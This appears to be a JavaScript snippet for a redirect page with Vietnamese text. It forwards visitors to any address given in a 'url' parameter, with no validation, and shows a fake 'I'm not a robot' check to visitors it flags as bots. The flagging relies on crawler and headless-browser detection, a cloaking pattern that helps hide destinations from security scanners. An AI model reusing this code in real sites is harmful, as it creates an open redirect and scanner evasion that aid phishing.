  const params = new URLSearchParams(location.search);
  const redirectUrl = params.get("url");
  const card = document.querySelector(".card");

  if (!redirectUrl) {
    setTimeout(() => location.href = "./", 1200);
  }

  let humanScore = 0;

  document.addEventListener("mousemove", () => humanScore++);
  document.addEventListener("touchstart", () => humanScore++);

  function isBot() {
    if (navigator.webdriver) return true;
    if (/Headless|bot|crawl|spider/i.test(navigator.userAgent)) return true;
    if (navigator.maxTouchPoints === 0 && humanScore < 2) return true;
    return false;
  }

  function showLoading() {
    card.innerHTML = `
      <div class="loader"></div>
      <p style="text-align:center;opacity:.7">Đang xử lý...</p>
    `;
  }

  function showVerify() {
    card.innerHTML = `
      <div class="verify-box">
        <h3>Xác minh bạn là con người</h3>
        <p>Vui lòng xác nhận để tiếp tục.</p>
        <button class="verify-btn" onclick="confirmHuman()">
          Tôi không phải robot
        </button>
      </div>
    `;
  }

  function confirmHuman() {
    showLoading();
    setTimeout(() => {
      location.href = decodeURIComponent(redirectUrl);
    }, 1200);
  }

  function goRedirect() {
    showLoading();

    setTimeout(() => {
      if (isBot()) {
        showVerify();
      } else {
        location.href = decodeURIComponent(redirectUrl);
      }
    }, 1000);
  }